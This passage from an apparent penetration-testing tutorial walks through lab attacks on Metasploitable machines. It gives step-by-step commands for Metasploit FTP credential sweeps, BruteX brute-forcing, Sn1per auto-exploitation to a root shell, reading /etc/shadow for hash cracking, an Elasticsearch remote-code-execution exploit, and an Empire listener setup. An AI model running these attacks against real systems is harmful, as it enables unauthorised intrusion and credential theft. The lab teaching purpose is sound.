- raw: "We use the FTP\\_Version scanner in Metasploit and set it to scan all systems\
    \ from 172.24.1.200 -172.24.1.220. You could set the range to any that you like.\
    \ When this module runs, you should see something like the screen below:\n\n![](images/00060.gif)\n\
    \nMetasploit scanned a range of network addresses and successfully detected the\
    \ vsFTP 2.3.4 service running on our Metasploitable machine. We recovered valid\
    \ FTP login credentials in the previous topic, we could use these to see if we\
    \ can login to an individual FTP server, or all FTP servers(!) using the scanner/ftp/ftp\\\
    _login module.\n\n        Enter, “back”\n\n        And then, “use auxiliary/scanner/ftp/ftp\\\
    _login”\n\nYou can type, “show options” if you want, to see what options you can\
    \ fill in. You could set the RHOSTS option to a range of systems if you wanted\
    \ to try to log into all FTP servers in that range. For this example, we will\
    \ just use our single system.\n\n        set RHOSTS 172.24.1.218\n\n       \
    \ set USERNAME user\n\n        set PASSWORD user\n\n        run\n\n![](images/00061.gif)\n\
    \nLogin successful! If we had numerous FTP servers running on the same network,\
    \ we could try the creds against the entire network, by simply changing the RHOSTS\
    \ value to a range of addresses and then re-running the module. This is Shown\
    \ in the example below: \n\n![](images/00062.jpeg)\n\nThis is just one module\
    \ example from Metasploit, take some time and check out the other scanner modules.\
    \ Just “use” the module and then type “show options” to see what you need to set.\
    \ Once your options are set, then run them as we did with this module. Metasploit\
    \ is extremely powerful and has a lot of features. I cover it in much more depth\
    \ in my other books. Let’s take a look at some other automated attack type tools.\
    \ \n\n### Brutex\n\nTool Author: xer0dayz\n\nTool Website: [https://github.com/1N3/BruteX](https://github.com/1N3/BruteX)\n\
    \nBrutex is an automated attack tool that attacks all ports using a Username/\
    \ Password combination brute force attack. We will be using the Metasploitable2\
    \ system and target the SMB port 445. \n\n        cd /pentest/exploitation/brutex\n\
    \n        sudo brutex 172.24.1.218 445\n\n![](images/00063.jpeg)\n\nAnd after\
    \ a short time, you should see:\n\n![](images/00064.gif)\n\nYou can also attack\
    \ multiple ports/ services by combining them with a comma:\n\n        sudo brutex\
    \ 172.24.1.218 22,23\n\nThe command above will cause BruteX to target the SSH\
    \ and Telnet ports, and in a short time, you should see the results below:\n\n\
    ![](images/00065.jpeg)\n\nThis tool has a lot more options and functionality.\
    \ For example, you can do OS detection, IDS evasion and also perform a sweep type\
    \ attack like we did with Metasploit. Take a few minutes and read through the\
    \ tool’s help screen to learn about its full capabilities.\n\n### Sn1per\n\nTool\
    \ Author: xer0dayz\n\nTool Website: [https://github.com/1N3/Sn1per](https://github.com/1N3/Sn1per)\n\
    \nSn1per has rapidly become one of my favorite tools. It is another automated\
    \ attack tool from the same author as BruteX, but this tool has many more features.\
    \ The professional version (not included) has become a go-to tool for many professional\
    \ pentesters.\n\nIf Sn1per is not installed, in a Terminal, enter:\n\n       \
    \ sudo git clone https://github.com/1N3/Sn1per.git\n\n        cd Sn1per\n\n       \
    \ sudo ./install.sh\n\nTo run: \n\n        enter, “sudo sniper -t 172.24.1.218\
    \ -b”\n\nThe “\\-t” tells Sn1per what target to attack, and the “\\-b” switch\
    \ enables brute force attacks. That’s all you will need, Sn1per will then began\
    \ a completely automated and tailored attack against the target. It will check\
    \ to see what ports are open, then attempt specific attacks against those ports,\
    \ based on vulnerabilities or service versions detected. As they say, “the proof\
    \ is in the pudding”, you can see in the screenshot below, it works very well\
    \ – Sn1per found a vulnerability, exploited it, and dropped us into a remote shell\
    \ with the target.\n\n![](images/00066.gif)\n\nIt will seem to pause at this point,\
    \ but you indeed have a remote shell with the target. Just type, “whoami” and\
    \ the remote system will respond as “root”. \n\nAs seen below:\n\n![](images/00067.gif)\n\
    \nAny commands you enter will be run on the target system and you will see the\
    \ result. For example, we could pull the “/etc/passwd” and “/etc/shadow” files,\
    \ get the users and password hashes and crack them using John the Ripper.\n\n\
    ![](images/00068.gif)\n\nCracking passwords is pretty straightforward, I cover\
    \ how to do this in my Basic Kali book. You probably wouldn’t want to use the\
    \ RPi to crack passwords though, you want something with a very powerful graphics\
    \ card for password cracking.  \n\nType “exit” to exit the remote shell – You\
    \ will then return to Sn1per, which will continue to attack other services. \n\
    \nSn1per can also directly attack web services sitting at particular ports. Using\
    \ this technique against Metasploitable3, you can also get a remote shell:\n\n\
            sudo sniper -t 172.24.1.120 -p 9200 -m webporthttp -w 172.24.1.120\n\n\
    This command running against a Metasploitable 3 server sitting at 172.24.1.120\
    \ and targeting port 9200 (elastic search) would normally return a remote shell,\
    \ but something is incompatible with it and the latest MSF5, so at the time of\
    \ this writing it is temporarily not working. I am sure it will be rectified in\
    \ a future update. \n\nWe barely scratched the surface of Sn1per’s capabilities.\
    \ Sn1per performs a ton of Recon, attack and reporting options. The at-cost Professional\
    \ version does even more. Check out the tool author’s website for more information. \
    \ \n\n### Elastic Search Attack with Metasploit Framework\n\nThough we couldn’t\
    \ show the Sn1per attack against Metasploitable 3’s Elastic Search service, we\
    \ can use the Metasploit Module that it uses to directly to attack it.  \n\nStart\
    \ Metasploit:\n\n        Enter, “msfconsole”\n\nAnd then:\n\n        use exploit/multi/elasticsearch/script\\\
    _mvel\\_rce\n\n        set RHOST 172.24.1.120\n\n        set RPORT 9200\n\n\
            exploit\n\nAs shown below, the exploit runs, and is successful. If you\
    \ run “shell” at the Meterpreter prompt you can see we have an interactive System\
    \ level shell:\n\n![](images/00069.jpeg)\n\nAnd that is it, we have a System level\
    \ remote shell through an Elasticsearch vulnerability!\n\n### EMPIRE-PS\n\nTool\
    \ Authors: harmj0y, sixdub, enigma0x3, rvrsh3ll, killswitch\\_gui, and xorrior\n\
    \nTool GitHub: [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)\n\
    \nFull Tool Documentation: [http://www.powershellempire.com/?page\\_id=83](http://www.powershellempire.com/?page_id=83)\n\
    \nEmpire is a go-to Python and PowerShell post exploitation framework. Empire\
    \ gives you the ability to run attack modules against Windows hosts through a\
    \ PowerShell based agent. In this section, we will walk through how Empire would\
    \ work against a Windows 10 Pro desktop. We need two things for Empire to work,\
    \ a Listener and a Payload. \n\nCreate the listener first, then create the payload:\n\
    \n        Change to the “/pentest/powershell/empire-ps” directory\n\n       \
    \ Enter, “sudo empire”\n\nAt the “(Empire) >” prompt, type “help” to see available\
    \ help.\n\n        Type “listeners”\n\n        Then type, “uselistener” followed\
    \ by a space and then hit tab twice to see a list of available listeners:\n\n\
    ![](images/00070.gif)\n\nThen just “uselistener” and the listener you want to\
    \ use. For this example, we will use http.\n\n        Enter, “uselistener http”\n\
    \n        Type, “info” to see available options:\n\n![](images/00071.gif)\n\n\
    Set options as you would in Metasploit, using the “set” command, with the option\
    \ and a value. The variables are case sensitive. \n\nSo, to set the port to 4444,\
    \ we would enter:\n\n        set Port 4444\n\nWe also need to set the host IP\
    \ address, with port:\n\n        set Host http://172.24.1.114:4444\n\nWhen done,\
    \ type “execute” to start the listener:\n\n![](images/00072.gif)\n\nYou can view\
    \ any active listeners by typing “listeners”:\n\n![](images/00073.jpeg)\n\nType\
    \ “back”, this returns you to the main menu:\n\n![](images/00074.gif)"
